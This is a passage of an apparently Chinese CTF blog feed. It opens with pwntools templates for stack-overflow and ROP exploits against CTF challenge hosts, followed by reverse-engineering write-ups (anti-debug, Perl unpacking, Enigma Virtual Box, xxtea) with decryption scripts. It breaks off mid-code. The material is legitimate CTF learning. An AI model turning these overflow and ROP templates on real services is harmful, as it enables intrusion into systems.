        <content type="html"><![CDATA[<h1 id="pwn-常用脚本模板"><a href="#pwn-常用脚本模板" class="headerlink" title="pwn 常用脚本模板"></a>pwn 常用脚本模板</h1><p>栈溢出脚本</p><p>（32 位）</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line">p = remote(<span class="string">&quot;pwn.challenge.ctf.show&quot;</span>,<span class="number">28181</span>)  <span class="comment">#创建一个远程连接，将程序与指定的主机和端口建立起联系</span></span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span>*<span class="number">9</span> +<span class="string">b&#x27;a&#x27;</span>*<span class="number">4</span>+p32(<span class="number">0x0804850F</span>)    <span class="comment">#地址是后门函数所在的函数开始的地址</span></span><br><span class="line">p.sendline(payload)                         <span class="comment">#将构造好的payload发送到远程连接的目标端点</span></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><p>（64 位）</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line">p = remote(<span class="string">&#x27;node5.buuoj.cn&#x27;</span>,<span class="number">25079</span>)</span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span>*<span class="number">15</span> +<span class="string">b&#x27;a&#x27;</span>*<span class="number">8</span>+p64(<span class="number">0x401186</span>)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><p>ROP 脚本</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line">p = remote(<span class="string">&#x27;node5.buuoj.cn&#x27;</span>,<span class="number">29267</span>)</span><br><span class="line">pop_rdi=<span class="number">0x0400713</span></span><br><span class="line">bin_addr=<span class="number">0x00400734</span></span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span>*<span class="number">64</span> +<span class="string">b&#x27;a&#x27;</span>*<span class="number">8</span>+p64(pop_rdi)+p64(bin_addr)+p64(<span class="number">0x400616</span>)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><p>bin_addr:是你要执行的指令字符串地址，ida 就可以查看（通常是&#x2F;bin&#x2F;sh，我这题是有点特殊）</p><p><img src="https://hesiy-md-pic.oss-cn-beijing.aliyuncs.com/images/pwn_script/bin_addr.png" alt="bin_addr"></p><p>pop _rdi 需要在 Ubuntu 中执行一个指令寻找</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ROPgadget --binary ./pwn1 --only &#x27;ret|pop&#x27;Gadgets information</span><br></pre></td></tr></table></figure><p>pwn1 替换成相应的文件名字</p><p><img src="https://hesiy-md-pic.oss-cn-beijing.aliyuncs.com/images/pwn_script/pop_rdi.png" alt="pop_rdi"></p><p>最后的地址是 system 在函数中所在的地址</p><p><img src="https://hesiy-md-pic.oss-cn-beijing.aliyuncs.com/images/pwn_script/system.png" alt="system"></p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>【cnss】新手教程：断点和异常</title>
      <link href="/2024/08/06/%E3%80%90cnss%E3%80%91%E6%96%B0%E6%89%8B%E6%95%99%E7%A8%8B%EF%BC%9A%E6%96%AD%E7%82%B9%E5%92%8C%E5%BC%82%E5%B8%B8/"/>
      <url>/2024/08/06/%E3%80%90cnss%E3%80%91%E6%96%B0%E6%89%8B%E6%95%99%E7%A8%8B%EF%BC%9A%E6%96%AD%E7%82%B9%E5%92%8C%E5%BC%82%E5%B8%B8/</url>
      
        <content type="html"><![CDATA[<h1 id="【cnss】新手教程：断点和异常"><a href="#【cnss】新手教程：断点和异常" class="headerlink" title="【cnss】新手教程：断点和异常"></a>【cnss】新手教程：断点和异常</h1><hr><p>打了一下cnss的新生赛，也是学到了点新东西</p><hr><h2 id="debugbreak"><a href="#debugbreak" class="headerlink" title="__debugbreak"></a>__debugbreak</h2><p>__debugbreak是个 api 当发生bug的时候要进行跳转进入到处理函数，这个题的关键就在debugbreak的处理函数中</p><hr><h2 id="【cnss】新手教程：断点和异常-1"><a href="#【cnss】新手教程：断点和异常-1" class="headerlink" title="【cnss】新手教程：断点和异常"></a>【cnss】新手教程：断点和异常</h2><p>假的flag骗我感情</p><p><img src="https://hesiy-md-pic.oss-cn-beijing.aliyuncs.com/images/CNSS%E6%96%B0%E7%94%9F%E8%B5%9B2024/breakpoint/fake_flag.png" alt="fake_flag"></p><p>查看伪代码</p><p><img src="https://hesiy-md-pic.oss-cn-beijing.aliyuncs.com/images/CNSS%E6%96%B0%E7%94%9F%E8%B5%9B2024/breakpoint/main.png" alt="main"></p><hr><p>跟进base64</p><p><img src="https://hesiy-md-pic.oss-cn-beijing.aliyuncs.com/images/CNSS%E6%96%B0%E7%94%9F%E8%B5%9B2024/breakpoint/base64.png" alt="base64"></p><p>发现这根本不是base64就是个异或</p><p>但是要注意这个debugbreak，先下个断点</p><hr><p>动调</p><p><img src="https://hesiy-md-pic.oss-cn-beijing.aliyuncs.com/images/CNSS%E6%96%B0%E7%94%9F%E8%B5%9B2024/breakpoint/%E5%8A%A8%E8%B0%83.png" alt="动调"></p><p>发现跟进不了debugbreak怎么办呢</p><hr><p>先跟进上面的key，</p><p><img src="https://hesiy-md-pic.oss-cn-beijing.aliyuncs.com/images/CNSS%E6%96%B0%E7%94%9F%E8%B5%9B2024/breakpoint/key.png" alt="key"></p><hr><p>然后再跟进byte_40B0478</p><p><img src="https://hesiy-md-pic.oss-cn-beijing.aliyuncs.com/images/CNSS%E6%96%B0%E7%94%9F%E8%B5%9B2024/breakpoint/findsub.png" alt="findsub"></p><p>发现跟进到的另一个函数</p><hr><p>这一大串是将真正的密文计算传到cipher</p><p><img src="https://hesiy-md-pic.oss-cn-beijing.aliyuncs.com/images/CNSS%E6%96%B0%E7%94%9F%E8%B5%9B2024/breakpoint/enc.png" alt="enc"></p><hr><p>切换到汇编，注意这里有两个反调试</p><p><img src="https://hesiy-md-pic.oss-cn-beijing.aliyuncs.com/images/CNSS%E6%96%B0%E7%94%9F%E8%B5%9B2024/breakpoint/%E5%8F%8D%E8%B0%83%E8%AF%95.png" alt="反调试"></p><p>运行完后就会传到cipher，然后结合之前的key写脚本就可以了</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">enc = [<span class="number">0x2A</span>, <span class="number">0x22</span>, <span class="number">0x1C</span>, <span class="number">0x05</span>, <span class="number">0x1E</span>, <span class="number">0x32</span>, <span class="number">0x0D</span>, <span class="number">0x07</span>, <span class="number">0x79</span>, <span class="number">0x53</span>,</span><br><span class="line">  <span class="number">0x09</span>, <span class="number">0x14</span>, <span class="number">0x2C</span>, <span class="number">0x61</span>, <span class="number">0x0B</span>, <span class="number">0x12</span>, <span class="number">0x52</span>, <span class="number">0x6B</span>, <span class="number">0x45</span>, <span class="number">0x05</span>,</span><br><span class="line">  <span class="number">0x7A</span>, <span class="number">0x56</span>, <span class="number">0x5E</span>, <span class="number">0x0C</span>, <span class="number">0x70</span>, <span class="number">0x2E</span>, <span class="number">0x0B</span>, <span class="number">0x4F</span>, <span class="number">0x48</span>, <span class="number">0x61</span>,</span><br><span class="line">  <span class="number">0x5B</span>, <span class="number">0x57</span>, <span class="number">0x2C</span>, <span class="number">0x06</span>, <span class="number">0x08</span>, <span class="number">0x11</span>, <span class="number">0x79</span>, <span class="number">0x2F</span>, <span class="number">0x56</span>, <span class="number">0x46</span>,</span><br><span class="line">  <span class="number">0x57</span>, <span class="number">0x7E</span>, <span class="number">0x2A</span>, <span class="number">0x43</span>, <span class="number">0x7A</span>, <span class="number">0x5B</span>, <span class="number">0x6F</span>, <span class="number">0x4E</span>, <span class="number">0x78</span>, <span class="number">0x22</span>,</span><br><span class="line">  <span class="number">0x1B</span>, <span class="number">0x0B</span>]</span><br><span class="line">xor = [<span class="number">0x49</span>, <span class="number">0x4C</span>, <span class="number">0x6F</span>, <span class="number">0x76</span>, <span class="number">0x65</span>, <span class="number">0x53</span>,</span><br><span class="line">       <span class="number">0x68</span>, <span class="number">0x31</span>, <span class="number">0x4E</span>, <span class="number">0x30</span>, <span class="number">0x3F</span>, <span class="number">0x21</span>]</span><br><span class="line">flag = <span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">52</span>):</span><br><span class="line">    flag += <span class="built_in">chr</span>(enc[i] ^ xor[i%<span class="number">12</span>])</span><br><span class="line"><span class="built_in">print</span>(flag)</span><br></pre></td></tr></table></figure>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>【perl】【buu】[WMCTF2020]easy_re</title>
      <link href="/2024/08/04/%E3%80%90perl%E3%80%91%E3%80%90buu%E3%80%91%5BWMCTF2020%5Deasy_re/"/>
      <url>/2024/08/04/%E3%80%90perl%E3%80%91%E3%80%90buu%E3%80%91%5BWMCTF2020%5Deasy_re/</url>
      
        <content type="html"><![CDATA[<h1 id="【perl】【buu】-WMCTF2020-easy-re"><a href="#【perl】【buu】-WMCTF2020-easy-re" class="headerlink" title="【perl】【buu】[WMCTF2020]easy_re"></a>【perl】【buu】[WMCTF2020]easy_re</h1><hr><p>也是学到新的东西了</p><hr><p>这题经过perl加密过的</p><p>查克无壳64位 ida</p><p>找了半天没找到一点有用的东西，倒是有几个奇怪字符</p><p><img src="https://hesiy-md-pic.oss-cn-beijing.aliyuncs.com/images/buu/%5BWMCTF2020%5Deasy_re/strang_string.png" alt="strang_string"></p><p>后来看了一下其他人的wp发现在字符串不断出现的perl是个提示</p><hr><h2 id="perl"><a href="#perl" class="headerlink" title="perl"></a>perl</h2><p>【看雪perl例题】<a href="https://bbs.kanxue.com/thread-67651.htm">https://bbs.kanxue.com/thread-67651.htm</a></p><p>00405276 |. 83C4 0C    |add   esp, 0C<br>00405279 |. 8945 F0    |mov   dword ptr [ebp-10], eax<br>0040527C |. 85C0      |test  eax, eax<br>0040527E |. 0F84 83000000 |je    00405307<br>00405284 |. 68 5CCF4000  |push  0040CF5C                ; ASCII “script”<br>00405289 |. 50        |push  eax<br>0040528A |. 8B03      |mov   eax, dword ptr [ebx]<br>0040528C |. FF30      |push  dword ptr [eax]<br>0040528E |. E8 CBEFFFFF  |call  0040425E<br>00405293 |. 83C4 0C    |add   esp, 0C<br>00405296 |. 8943 24    |mov   dword ptr [ebx+24], eax<br>00405299 |. 85C0      |test  eax, eax<br>0040529B |. 0F84 32020000 |je    004054D3<br>004052A1 |. 68 50CF4000  |push  0040CF50                   ; &#x2F;s &#x3D; “hashline”<br>004052A6 |. FF75 F0    |push  dword ptr [ebp-10]          ; |&#x2F;s<br>004052A9 |. E8 38360000  |call  &lt;jmp.&amp;MSVCRT.strlen&gt;          ; |\strlen<br>004052AE |. 8BD8      |mov   ebx, eax                   ; |<br>004052B0 |. C70424 40CF40&gt;|mov   dword ptr [esp], 0040CF40    ; |ASCII “-e#line 1 “”%s”””<br>004052B7 |. E8 2A360000  |call  &lt;jmp.&amp;MSVCRT.strlen&gt;          ; \strlen<br>004052BC |. 59        |pop   ecx<br>004052BD |. 03D8      |add   ebx, eax<br>004052BF |. 53        |push  ebx<br>004052C0 |. E8 46EEFFFF  |call  0040410B</p><p>这个地方0040528E call  0040425E 就是解压的过程，直接f8过了以后eax里面就是你的源代码了。</p><p>【perl简单介绍】<a href="https://www.bilibili.com/video/BV1qB4y1G7B3/?spm_id_from=333.880.my_history.page.click&vd_source=1c1b392be21faf2076e99a04a9cb6b82">https://www.bilibili.com/video/BV1qB4y1G7B3/?spm_id_from=333.880.my_history.page.click&amp;vd_source=1c1b392be21faf2076e99a04a9cb6b82</a></p><p>perl是解释语言，perlapp只是把你的perl程序压缩后放在资源里面，执行的时候会解压的。</p><hr><h2 id="解题"><a href="#解题" class="headerlink" title="解题"></a>解题</h2><p>在ida里动调找太坐牢了所以选择行x64dbg</p><p>F8单步一直到进入主函数</p><p><img src="https://hesiy-md-pic.oss-cn-beijing.aliyuncs.com/images/buu/%5BWMCTF2020%5Deasy_re/main.png" alt="main"></p><hr><p>进入主函数后进行搜索script</p><p><img src="https://hesiy-md-pic.oss-cn-beijing.aliyuncs.com/images/buu/%5BWMCTF2020%5Deasy_re/search.png" alt="search"></p><hr><p>跟进后在这里打断点</p><p><img src="https://hesiy-md-pic.oss-cn-beijing.aliyuncs.com/images/buu/%5BWMCTF2020%5Deasy_re/break.png" alt="break"></p><hr><p>开始单步调试</p><p><img src="https://hesiy-md-pic.oss-cn-beijing.aliyuncs.com/images/buu/%5BWMCTF2020%5Deasy_re/flag.png" alt="flag"></p><p>flag被解密出来</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>【virtualbox】【buu】 [GKCTF 2021]QQQQT</title>
      <link href="/2024/08/02/%5BGKCTF%202021%5DQQQQT/"/>
      <url>/2024/08/02/%5BGKCTF%202021%5DQQQQT/</url>
      
        <content type="html"><![CDATA[<h1 id="【buu】-GKCTF-2021-QQQQT"><a href="#【buu】-GKCTF-2021-QQQQT" class="headerlink" title="【buu】 [GKCTF 2021]QQQQT"></a>【buu】 [GKCTF 2021]QQQQT</h1><hr><p>这题吧，不难，主要是用exeinfope光看是不是upx加壳没仔细看下面的virtualbox了</p><hr><p>查壳</p><p><img src="https://hesiy-md-pic.oss-cn-beijing.aliyuncs.com/images/buu/QQQQT/check_package.png" alt="check_package"></p><p>看ep是.text实际上这是个 Virtual Box加壳</p><p>去找工具EnigmaVBUnpacker脱壳</p><p><img src="https://hesiy-md-pic.oss-cn-beijing.aliyuncs.com/images/buu/QQQQT/unpackage.png" alt="unpackage"></p><p>脱壳后会在文件所在的文件夹中新生成QQQQT_unpacked.exe</p><p><img src="https://hesiy-md-pic.oss-cn-beijing.aliyuncs.com/images/buu/QQQQT/unpacked.png" alt="unpacked"></p><hr><p>用ida打开QQQQT_unpacked.exe</p><p>通过string找到密文</p><p><img src="https://hesiy-md-pic.oss-cn-beijing.aliyuncs.com/images/buu/QQQQT/string.png" alt="string"></p><hr><p>跟进</p><p><img src="https://hesiy-md-pic.oss-cn-beijing.aliyuncs.com/images/buu/QQQQT/base58.png" alt="base58"></p><p>疑似是base58</p><p><img src="https://hesiy-md-pic.oss-cn-beijing.aliyuncs.com/images/buu/QQQQT/flag.png" alt="flag"></p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>【buu】【另一种抽象的xxtea】[2019红帽杯]xx</title>
      <link href="/2024/07/31/%E3%80%90buu%E3%80%91%E3%80%90%E5%8F%A6%E4%B8%80%E7%A7%8D%E6%8A%BD%E8%B1%A1%E7%9A%84xxtea%E3%80%91%5B2019%E7%BA%A2%E5%B8%BD%E6%9D%AF%5Dxx/"/>
      <url>/2024/07/31/%E3%80%90buu%E3%80%91%E3%80%90%E5%8F%A6%E4%B8%80%E7%A7%8D%E6%8A%BD%E8%B1%A1%E7%9A%84xxtea%E3%80%91%5B2019%E7%BA%A2%E5%B8%BD%E6%9D%AF%5Dxx/</url>
      
        <content type="html"><![CDATA[<h1 id="【buu】【另一种抽象的xxtea】-2019红帽杯-xx"><a href="#【buu】【另一种抽象的xxtea】-2019红帽杯-xx" class="headerlink" title="【buu】【另一种抽象的xxtea】[2019红帽杯]xx"></a>【buu】【另一种抽象的xxtea】[2019红帽杯]xx</h1><p>b题看了一整天，总算是看明白了TMD</p><hr><p>查克无壳64位，拖入ida</p><p>发现一很大一坨代码，慢慢分析吧</p><p><img src="https://hesiy-md-pic.oss-cn-beijing.aliyuncs.com/images/buu/%5B2019%E7%BA%A2%E5%B8%BD%E6%9D%AF%5Dxx/put_in.png" alt="put_in"></p><p>有个输入函数和v6</p><p>这里的v6后面的Code不是上面要输入Code，跟进发现是另外的一串字符</p><hr><p><img src="https://hesiy-md-pic.oss-cn-beijing.aliyuncs.com/images/buu/%5B2019%E7%BA%A2%E5%B8%BD%E6%9D%AF%5Dxx/check.png" alt="check"></p><p>这里也是要吐槽煞笔ida伪代码的反编译的表达形式</p><p>*(v9 + Code - v5)表示的code[v9-v5]</p><p>这v13是检测v6的长度</p><p>if语句是遍历检测输入的字符是否在v6的范围内，是的话就跳出循环，</p><p>如果有不属于v6的字符存在v11就会累加到36</p><p>v14这一小段也是检测v6长度</p><p>当有不属于v6的字符存在时就会退出</p><p>v9 - v5 &lt; 4表达的是这一段代码只截取输入的前四个字符</p><hr><p><img src="https://hesiy-md-pic.oss-cn-beijing.aliyuncs.com/images/buu/%5B2019%E7%BA%A2%E5%B8%BD%E6%9D%AF%5Dxx/check2.png" alt="check2"></p><p>这里v3搞错了应该是19，这里的code是输入</p><p>v30动调出来的是输入的flag的前四个字符</p><p>下面的连续的4个 <strong>if</strong> 表明前四个字符不能是0</p><hr><p><img src="https://hesiy-md-pic.oss-cn-beijing.aliyuncs.com/images/buu/%5B2019%E7%BA%A2%E5%B8%BD%E6%9D%AF%5Dxx/key_exbend%26xxtea%26mix.png" alt="key_exbend&amp;xxtea&amp;mix"></p><p>首先这个循环是一个密钥扩展，是把输入的flag前四个字母扩展成16位，也就是4个4位的密钥</p><p>然后内个sub_7FF7ADD11AB0是比较抽象的xxtea加密，具体是用一个插件<strong>FindCrypt</strong>和结合题目猜测可能是xxtea</p><p>Size是动调出来的是个固定值24</p><p>然后就是进行位置交换混淆</p><hr><p><img src="https://hesiy-md-pic.oss-cn-beijing.aliyuncs.com/images/buu/%5B2019%E7%BA%A2%E5%B8%BD%E6%9D%AF%5Dxx/xor%26enc.png" alt="xor&amp;enc"></p><p>这里的异或最开始没看懂</p><p>首先是这个++v22这个v22可以认为是一个数组，++v22是指向数组的后一个元素</p><p>然后里面的if语句表示要从3开始异或，所以前三个（0-2）元素不会进行操作</p><p>当从3开始会进行异或，把<strong>当前的v22的值</strong>与<strong>从0位置开始的v20</strong>进行异或</p><p>每三个元素为一组，每组比上一组多进行一次异或，</p><p>多进行的那一次异或，是将<strong>刚才异或得到的值</strong>与**v20[（刚才得值+1）]**进行异或</p><p>一直到v21 &#x3D;  23进行最后一次循环</p><p>v30 v30[1] v31 v32是密文。但是要注意小端序，建议动调调到这里直接提取</p><hr><p>综上我们先把换位混淆的密文和迭代异或先给解回去</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;Windows.h&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="type">int</span> mix[] = &#123; <span class="number">0xCE</span>, <span class="number">0xBC</span>, <span class="number">0x40</span>, <span class="number">0x6B</span>, <span class="number">0x7C</span>, <span class="number">0x3A</span>, <span class="number">0x95</span>, <span class="number">0xC0</span>, <span class="number">0xEF</span>, <span class="number">0x9B</span>, </span><br><span class="line">  <span class="number">0x20</span>, <span class="number">0x20</span>, <span class="number">0x91</span>, <span class="number">0xF7</span>, <span class="number">0x02</span>, <span class="number">0x35</span>, <span class="number">0x23</span>, <span class="number">0x18</span>, <span class="number">0x02</span>, <span class="number">0xC8</span>, </span><br><span class="line">  <span class="number">0xE7</span>, <span class="number">0x56</span>, <span class="number">0x56</span>, <span class="number">0xFA</span>&#125;;</span><br><span class="line">  </span><br><span class="line">  <span class="type">int</span> enc[<span class="number">24</span>];</span><br><span class="line">  <span class="type">int</span> count = <span class="number">0</span>;</span><br><span class="line">  </span><br><span class="line">  <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">23</span>; i &gt;=<span class="number">3</span>; i--)</span><br><span class="line">&#123;</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> j = <span class="number">6</span>-count; j &gt;= <span class="number">0</span>; j--)</span><br><span class="line">&#123;</span><br><span class="line">mix[i]^=mix[j];</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (i % <span class="number">3</span> == <span class="number">0</span>)</span><br><span class="line">&#123;</span><br><span class="line">count++;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line">  enc[<span class="number">2</span>] = mix[<span class="number">0</span>];</span><br><span class="line">enc[<span class="number">0</span>] = mix[<span class="number">1</span>];</span><br><span class="line">enc[<span class="number">3</span>] = mix[<span class="number">2</span>];</span><br><span class="line">enc[<span class="number">1</span>] = mix[<span class="number">3</span>];</span><br><span class="line">enc[<span class="number">6</span>] = mix[<span class="number">4</span>];</span><br><span class="line">enc[<span class="number">4</span>] = mix[<span class="number">5</span>];</span><br><span class="line">enc[<span class="number">7</span>] = mix[<span class="number">6</span>];</span><br><span class="line">enc[<span class="number">5</span>] = mix[<span class="number">7</span>];</span><br><span class="line">enc[<span class="number">10</span>] = mix[<span class="number">8</span>];</span><br><span class="line">enc[<span class="number">8</span>] = mix[<span class="number">9</span>];</span><br><span class="line">enc[<span class="number">11</span>] = mix[<span class="number">10</span>];</span><br><span class="line">enc[<span class="number">9</span>] = mix[<span class="number">11</span>];</span><br><span class="line">enc[<span class="number">14</span>] = mix[<span class="number">12</span>];</span><br><span class="line">enc[<span class="number">12</span>] = mix[<span class="number">13</span>];</span><br><span class="line">enc[<span class="number">15</span>] = mix[<span class="number">14</span>];</span><br><span class="line">enc[<span class="number">13</span>] = mix[<span class="number">15</span>];</span><br><span class="line">enc[<span class="number">18</span>] = mix[<span class="number">16</span>];</span><br><span class="line">enc[<span class="number">16</span>] = mix[<span class="number">17</span>];</span><br><span class="line">enc[<span class="number">19</span>] = mix[<span class="number">18</span>];</span><br><span class="line">enc[<span class="number">17</span>] = mix[<span class="number">19</span>];</span><br><span class="line">enc[<span class="number">22</span>] = mix[<span class="number">20</span>];</span><br><span class="line">enc[<span class="number">20</span>] = mix[<span class="number">21</span>];</span><br><span class="line">enc[<span class="number">23</span>] = mix[<span class="number">22</span>];</span><br><span class="line">enc[<span class="number">21</span>] = mix[<span class="number">23</span>];</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">24</span>; i++)</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;0x%x,&quot;</span>, enc[i]);</span><br><span class="line">  </span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>然后再找一个xxtea脚本进行解密</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdint.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> DELTA 0x9e3779b9</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> MX (((z&gt;&gt;5^y<span class="string">&lt;&lt;2) + (y&gt;</span>&gt;3^z&lt;&lt;4)) ^ ((sum^y) + (key[(p&amp;3)^e] ^ z)))</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">btea</span><span class="params">(<span class="type">uint32_t</span> *v, <span class="type">int</span> n, <span class="type">uint32_t</span> <span class="type">const</span> key[<span class="number">4</span>])</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="type">uint32_t</span> y, z, sum;</span><br><span class="line">    <span class="type">unsigned</span> p, rounds, e;</span><br><span class="line">    <span class="keyword">if</span> (n &gt; <span class="number">1</span>)            <span class="comment">/* Coding Part */</span></span><br><span class="line">    &#123;</span><br><span class="line">        rounds = <span class="number">6</span> + <span class="number">52</span>/n;</span><br><span class="line">        sum = <span class="number">0</span>;</span><br><span class="line">        z = v[n<span class="number">-1</span>];</span><br><span class="line">        <span class="keyword">do</span></span><br><span class="line">        &#123;</span><br><span class="line">            sum += DELTA;</span><br><span class="line">            e = (sum &gt;&gt; <span class="number">2</span>) &amp; <span class="number">3</span>;</span><br><span class="line">            <span class="keyword">for</span> (p=<span class="number">0</span>; p&lt;n<span class="number">-1</span>; p++)</span><br><span class="line">            &#123;</span><br><span class="line">                y = v[p+<span class="number">1</span>];</span><br><span class="line">                z = v[p] += MX;</span><br><span class="line">            &#125;</span><br><span class="line">            y = v[<span class="number">0</span>];</span><br><span class="line">            z = v[n<span class="number">-1</span>] += MX;</span><br><span class="line">        &#125;<span class="keyword">while</span> (--rounds);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span> (n &lt; <span class="number">-1</span>)      <span class="comment">/* Decoding Part */</span></span><br><span class="line">    &#123;</span><br><span class="line">        n = -n;</span><br><span class="line">        rounds = <span class="number">6</span> + <span class="number">52</span>/n;</span><br><span class="line">        sum = rounds*DELTA;</span><br><span class="line">        y = v[<span class="number">0</span>];</span><br><span class="line">        <span class="keyword">do</span></span><br><span class="line">        &#123;</span><br><span class="line">            e = (sum &gt;&gt; <span class="number">2</span>) &amp; <span class="number">3</span>;</span><br><span class="line">            <span class="keyword">for</span> (p=n<span class="number">-1</span>; p&gt;<span class="number">0</span>; p--)</span><br><span class="line">            &#123;</span><br><span class="line">                z = v[p<span class="number">-1</span>];</span><br><span class="line">                y = v[p] -= MX;</span><br><span class="line">            &#125;</span><br><span class="line">            z = v[n<span class="number">-1</span>];</span><br><span class="line">            y = v[<span class="number">0</span>] -= MX;</span><br><span class="line">            sum -= DELTA;</span><br><span class="line">        &#125;<span class="keyword">while</span> (--rounds);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="type">uint32_t</span> v[<span class="number">6</span>]= &#123;<span class="number">0x40cea5bc</span>,<span class="number">0xe7b2b2f4</span>,<span class="number">0x129d12a9</span>,<span class="number">0x5bc810ae</span>,<span class="number">0x1d06d73d</span>,<span class="number">0xdcf870dc</span>&#125;;</span><br><span class="line">    <span class="type">uint32_t</span> <span class="type">const</span> k[<span class="number">4</span>]= &#123;(<span class="type">unsigned</span> <span class="type">int</span>)<span 